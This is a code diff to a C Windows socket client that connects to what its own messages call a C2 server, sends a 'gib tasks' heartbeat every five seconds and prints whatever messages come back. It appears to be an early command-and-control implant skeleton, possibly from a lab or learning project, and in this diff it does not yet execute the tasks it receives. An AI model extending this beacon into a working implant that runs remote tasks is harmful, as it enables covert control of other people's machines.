@@ -25,7 +25,9 @@ int main() {
 	hints.ai_socktype = SOCK_STREAM;
 	hints.ai_protocol = IPPROTO_TCP;
 	hints.ai_flags = AI_PASSIVE;
-	int iResult = getaddrinfo("129.21.253.188", DEFAULT_PORT, &hints, &result);
+	
+	//PLANNED FEATURE: get ip address of server and pass it into here before compile
+	int iResult = getaddrinfo("192.168.232.1", DEFAULT_PORT, &hints, &result);
 
 	if (iResult != 0) {
 		printf("getaddrinfo failed with error %d\n", iResult);
@@ -33,31 +35,42 @@ int main() {
 		return 1;
 	}
 
-	SOCKET clientSocket = socket(result->ai_family, result->ai_socktype, result->ai_protocol);
-
-	connect(clientSocket, result->ai_addr, (int)result->ai_addrlen);
+	//create socket and attempt to connect to server 
+	SOCKET ConnectSocket = socket(result->ai_family, result->ai_socktype, result->ai_protocol);
+	iResult = connect(ConnectSocket, result->ai_addr, (int)result->ai_addrlen);
+	if (iResult == SOCKET_ERROR) {
+		closesocket(ConnectSocket);
+		ConnectSocket = INVALID_SOCKET;
+		printf("Unable to connect to C2\n");
+		return 1;
+	}
 	freeaddrinfo(result);
 	
+	//Infinite loop for recieving and sending back information 
+
+	//Infinite loop that serves as the heartbeat
 	while(true) {
-		printf("Ready to recieve\n");
+		// Send a message to the server, asking for tasks
+		send(ConnectSocket, "gib tasks", strlen("gib tasks"), 0);
+
+		//printf("Ready to recieve\n");
 		char recvmessage[DEFAULT_BUFFLEN];
 		ZeroMemory(recvmessage, DEFAULT_BUFFLEN);
-		recv(clientSocket, recvmessage, DEFAULT_BUFFLEN, 0);
+		recv(ConnectSocket, recvmessage, DEFAULT_BUFFLEN, 0);
 
 		if (strcmp(recvmessage, "quit") == 0) {
-			send(clientSocket, "\xff", DEFAULT_BUFFLEN, 0);
+			send(ConnectSocket, "\xff", DEFAULT_BUFFLEN, 0);
 			break;
 		}
 		else {
 			printf("Recieved message %s\n", recvmessage);
-			send(clientSocket, "Hello Server!", strlen("Hello Server!"), 0);
-			send(clientSocket, "\xff", strlen("\xff"), 0);
+			//send(ConnectSocket, "Hello Server!", strlen("Hello Server!"), 0);
+			//send(ConnectSocket, "\xff", strlen("\xff"), 0);
 		}
-		//Sleep(5000);
+		Sleep(5000);
 	}
 	
-
-	closesocket(clientSocket);
+	closesocket(ConnectSocket);
 	WSACleanup();
 	return 0;
 
